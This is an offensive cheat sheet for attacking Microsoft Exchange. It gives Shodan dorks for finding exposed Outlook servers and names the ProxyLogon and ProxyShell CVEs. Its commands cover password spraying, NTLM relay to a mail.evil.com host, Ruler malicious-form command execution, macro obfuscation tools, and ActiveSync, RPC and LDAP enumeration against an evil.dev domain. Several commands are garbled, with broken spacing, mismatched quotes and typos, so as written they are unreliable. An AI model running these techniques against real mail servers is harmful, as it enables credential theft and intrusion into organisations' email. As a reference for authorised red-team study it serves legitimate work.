# Exchange Attacks

#### Information Gathering



```
shodan search "'X-AspNet-Version http.title:'Outlook' –'x-owa-version'"
shodan search "http.favicon.hash:44274939"
shodan search "http.title:outlook exchange"
```

#### Attacks



**AutotDiscover**



```
   autodiscover/autodiscover.xml
```

**Known Vuln**

```
ProxyLogon(2021-26855)
ProxyShell(2021-34473)
HAFNIUM(2021-26858)
```

**Spray**

```
Invoke-PasswordSprayOWA
Invoke-PasswordSprayEWS
```

**NTLM Auth**

```
   nmap --script http-ntlm-info
```

**NTLMRelay**

```
reponder
./exchangeRelayx.py -t https://mail.evil.com
```

**GAL**

```
Get-GlobalAddressList -ExchHostname mail.domain.com -UserName
domain\username -Password password -OutFile global-address-list.txt
```

**Exchange Admin Group Deligation**

```
Bloodhound
net
```

**Rule**



```
   GUI
```

```
   Ruler
```

**Forms**



```
   ./ruler --email user@evil.dev form add --suffix superduper --input command.txt --send
```

**Anti-Malware**



```
evilmacro
macropack
```

**ActiveSync(LDAP)**



```
   LDAPPER. py -D EVIL -U 'Administrator' -P ‘password’ -S DC02.EVIL.DEV
' (msExchDeviceID=123456)
```

**ActiveSync(SMB Share)**



```
   peas - u ' EVIL.DEV\sh' -p '[password]' mail.evil.dev --list-unc'\\DC01\'
```

**ActiveSync(WSS)**



```
   peas -U ' EVIL.DEC\user’ -p ‘password’ exch01.evil.dev - -smb-user=‘EVIL\sharepoint-setup'
• - smb-pass=' password’ •-list-unc 'http://SHP01/share’
```

**RPC**



```
   nmap mail.evil.dev -p 6001 -sV - sC
```

```
 rpcmap . py -debug -auth-transport’EVIL/user:password’
'ncacn http: /6001,RpcProxy=mail.evil.dev: 443]'
```

```
 rpcmap.py -debug -auth-transport 'EVIL/user:password' -auth-rpc 'EVIL/mia:password' -auth-level 6 -brute-opnums 'ncacn_http:[6001,RpcProxy=mail.evil.dev:443]'
```

**LDAP**



```
 LDAPPER. py -D EVIL - U 'Administrator' -P ‘password’ -S DC01. EVIL.DEV
(mail=user@evil.dev) mail objectGUID legacyExchangeDN distinguishedName
```

```
exchanger. py EVIL/user: ‘password’@mail.evil.dev nspi
dump -tables -name Hackers -lookup-tvpe EXTENDED
```

**Phishing**



```
   gophish
```
